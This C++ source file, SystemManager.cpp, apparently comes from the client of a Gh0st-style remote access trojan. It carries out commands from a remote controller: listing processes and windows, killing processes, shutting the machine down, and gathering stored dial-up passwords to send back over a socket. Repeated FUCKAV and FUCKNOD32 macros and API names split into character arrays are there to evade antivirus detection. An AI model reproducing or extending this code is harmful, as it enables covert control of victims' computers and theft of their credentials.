// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "Dialupass.h"
#include "SystemManager.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
{
	SendProcessList();
}

CSystemManager::~CSystemManager()
{

}
void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:
		SendDialupassList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	typedef HLOCAL (WINAPI *LocalFreeT)
		(
		__deref HLOCAL hMem
		);
	LocalFreeT pLocalFree = (LocalFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFree");

	typedef SIZE_T
		(WINAPI
		*LocalSizeT)(
		__in HLOCAL hMem
		);
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");

	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	pLocalFree(lpBuffer);
}



void CSystemManager::SendDialupassList()
{
	typedef HLOCAL (WINAPI *LocalAllocT)
		(
		__in UINT uFlags,
		__in SIZE_T uBytes
		);
	LocalAllocT pLocalAlloc = (LocalAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalAlloc");

	typedef SIZE_T
		(WINAPI
		*LocalSizeT)(
		__in HLOCAL hMem
		);
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef HLOCAL (WINAPI *LocalFreeT)
		(
		__deref HLOCAL hMem
		);
	LocalFreeT pLocalFree = (LocalFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFree");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	CDialupass	pass;
	
	int	nPacketLen = 0;
	for (int i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += plstrlenA(pOneInfo->Get(j)) + 1;
	}
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)pLocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;
	
	for (i = 0; i < pass.GetMax(); i++)
	{
		
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = plstrlenA(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	pLocalFree(lpBuffer);
	
}
void CSystemManager::SendWindowsList()
{
	typedef HLOCAL (WINAPI *LocalFreeT)
		(
		__deref HLOCAL hMem
		);
	LocalFreeT pLocalFree = (LocalFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFree");
	
	typedef SIZE_T
		(WINAPI
		*LocalSizeT)(
		__in HLOCAL hMem
		);
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	pLocalFree(lpBuffer);	
}

LPBYTE CSystemManager::getProcessList()
{
	typedef HANDLE (WINAPI *CreateToolhelp32SnapshotT)
		(
		DWORD dwFlags,
		DWORD th32ProcessID
		);
	CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot = (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateToolhelp32Snapshot");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef BOOL (WINAPI *Process32FirstT)
		(
		HANDLE hSnapshot,
		LPPROCESSENTRY32 lppe
		);
	Process32FirstT pProcess32First = (Process32FirstT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"Process32First");

	typedef BOOL (WINAPI *Process32NextT)
		(
		HANDLE hSnapshot,
		LPPROCESSENTRY32 lppe
		);
	Process32NextT pProcess32Next = (Process32NextT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"Process32Next");

	typedef HLOCAL (WINAPI *LocalAllocT)
		(
		__in UINT uFlags,
		__in SIZE_T uBytes
		);
	LocalAllocT pLocalAlloc = (LocalAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalAlloc");

	typedef __out  HLOCAL (WINAPI *LocalReAllocT)
		(
		__in HLOCAL hMem, __in SIZE_T uBytes, __in UINT uFlags 
		);
	LocalReAllocT pLocalReAlloc = (LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalReAlloc");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);

	
	typedef DWORD
		(WINAPI
		*GetModuleFileNameExAT)(
		HANDLE hProcess,
		HMODULE hModule,
		LPSTR lpFilename,
		DWORD nSize
		);
	GetModuleFileNameExAT pGetModuleFileNameExA=(GetModuleFileNameExAT)GetProcAddress(LoadLibrary("PSAPI.DLL"),"GetModuleFileNameExA");

	
	typedef BOOL
		(WINAPI
		*EnumProcessModulesT)(
		HANDLE hProcess,
		HMODULE *lphModule,
		DWORD cb,
		LPDWORD lpcbNeeded
		);
	EnumProcessModulesT pEnumProcessModules=(EnumProcessModulesT)GetProcAddress(LoadLibrary("PSAPI.DLL"),"EnumProcessModules");

	typedef SIZE_T
		(WINAPI
		*LocalSizeT)(
		__in HLOCAL hMem
		);
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");

	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)pLocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	if(pProcess32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				pEnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				pGetModuleFileNameExA(hProcess, hModules, strProcessName, sizeof(strProcessName));
				
				// 此进程占用数据大小
				dwLength = sizeof(DWORD) + plstrlenA(pe32.szExeFile) + plstrlenA(strProcessName) + 2;
				// 缓冲区太小，再重新分配下
				if (pLocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, plstrlenA(pe32.szExeFile) + 1);
				dwOffset += plstrlenA(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, plstrlenA(strProcessName) + 1);
				dwOffset += plstrlenA(strProcessName) + 1;
			}
		}
		while(pProcess32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	pCloseHandle(hSnapshot);
	return lpBuffer;	
}
void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	typedef VOID (WINAPI *SleepT)
		(
		__in DWORD dwMilliseconds
		);
	SleepT pSleep = (SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"Sleep");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef BOOL (WINAPI *TerminateProcessT)
		(
		__in HANDLE hProcess, __in UINT uExitCode
		);
	TerminateProcessT pTerminateProcess = (TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"TerminateProcess");
	
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);

	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	for (int i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		pTerminateProcess(hProcess, 0);
		pCloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	pSleep(100);
	// 刷新进程列表
	SendProcessList();
	// 刷新窗口列表
	SendWindowsList();	
}


void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	
	typedef BOOL
		(WINAPI
		*ExitWindowsExT)(
		__in UINT uFlags,
		__in DWORD dwReason);
	ExitWindowsExT pExitWindowsEx=(ExitWindowsExT)GetProcAddress(LoadLibrary("USER32.dll"),"ExitWindowsEx");

	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	pExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	typedef HLOCAL (WINAPI *LocalAllocT)
		(
		__in UINT uFlags,
		__in SIZE_T uBytes
		);
	LocalAllocT pLocalAlloc = (LocalAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalAlloc");

	typedef __out  HLOCAL (WINAPI *LocalReAllocT)
		(
		__in HLOCAL hMem, __in SIZE_T uBytes, __in UINT uFlags 
		);
	LocalReAllocT pLocalReAlloc = (LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalReAlloc");

	typedef int
		(WINAPI
		*GetWindowTextAT)(
		__in HWND hWnd,
		__out_ecount(nMaxCount) LPSTR lpString,
		__in int nMaxCount);
	GetWindowTextAT pGetWindowTextA=(GetWindowTextAT)GetProcAddress(LoadLibrary("USER32.dll"),"GetWindowTextA");

	typedef BOOL
		(WINAPI
		*IsWindowVisibleT)(
		__in HWND hWnd);
	IsWindowVisibleT pIsWindowVisible=(IsWindowVisibleT)GetProcAddress(LoadLibrary("USER32.dll"),"IsWindowVisible");
	
	typedef DWORD
		(WINAPI
		*GetWindowThreadProcessIdT)(
		__in HWND hWnd,
		__out_opt LPDWORD lpdwProcessId);
	GetWindowThreadProcessIdT pGetWindowThreadProcessId=(GetWindowThreadProcessIdT)GetProcAddress(LoadLibrary("USER32.dll"),"GetWindowThreadProcessId");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef SIZE_T
		(WINAPI
		*LocalSizeT)(
		__in HLOCAL hMem
		);
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	
	typedef int
		(WINAPI
		*lstrlenAT)(
		__in LPCSTR lpString
		);	
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");


	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	pGetWindowTextA(hwnd, strTitle, sizeof(strTitle));
	
	if (!pIsWindowVisible(hwnd) || plstrlenA(strTitle) == 0)
		return true;
	
	
	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)pLocalAlloc(LPTR, 1);
	
	dwLength = sizeof(DWORD) + plstrlenA(strTitle) + 1;
	dwOffset = pLocalSize(lpBuffer);
	
	lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	pGetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, plstrlenA(strTitle) + 1);
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	*(LPBYTE *)lParam = lpBuffer;
	
	return true;
}

LPBYTE CSystemManager::getWindowsList()
{
	typedef BOOL
		(WINAPI
		*EnumWindowsT)(
		__in WNDENUMPROC lpEnumFunc,
		__in LPARAM lParam);
	EnumWindowsT pEnumWindows=(EnumWindowsT)GetProcAddress(LoadLibrary("USER32.dll"),"EnumWindows");

	LPBYTE	lpBuffer = NULL;
	pEnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}
bool CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	typedef BOOL (WINAPI *GetLastErrorT)
		(
		VOID
		);
	char FhTZBW[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError = (GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FhTZBW);
	
	typedef BOOL
		(WINAPI
		*AdjustTokenPrivilegesT)(
		__in      HANDLE TokenHandle,
		__in      BOOL DisableAllPrivileges,
		__in_opt  PTOKEN_PRIVILEGES NewState,
		__in      DWORD BufferLength,
		__out_bcount_part_opt(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,
		__out_opt PDWORD ReturnLength
		);	
	char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	AdjustTokenPrivilegesT pAdjustTokenPrivileges=(AdjustTokenPrivilegesT)GetProcAddress(LoadLibrary(KIoFqQPSy),"AdjustTokenPrivileges");

	typedef BOOL
		(WINAPI
		*LookupPrivilegeValueAT)(
		__in_opt LPCSTR lpSystemName,
		__in     LPCSTR lpName,
		__out    PLUID   lpLuid
		);
	LookupPrivilegeValueAT pLookupPrivilegeValueA=(LookupPrivilegeValueAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"LookupPrivilegeValueA");
	FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
		ANTIVIRUS
		FUCKNOD32
	FUCKAV
	typedef BOOL
		(WINAPI
		*OpenProcessTokenT)(
		__in        HANDLE ProcessHandle,
		__in        DWORD DesiredAccess,
		__deref_out PHANDLE TokenHandle
		);	
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)GetProcAddress(LoadLibrary(KIoFqQPSy),"OpenProcessToken");

	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);

	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!pOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	pLookupPrivilegeValueA(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	pAdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (pGetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	pCloseHandle(hToken);
	return bResult;	
}
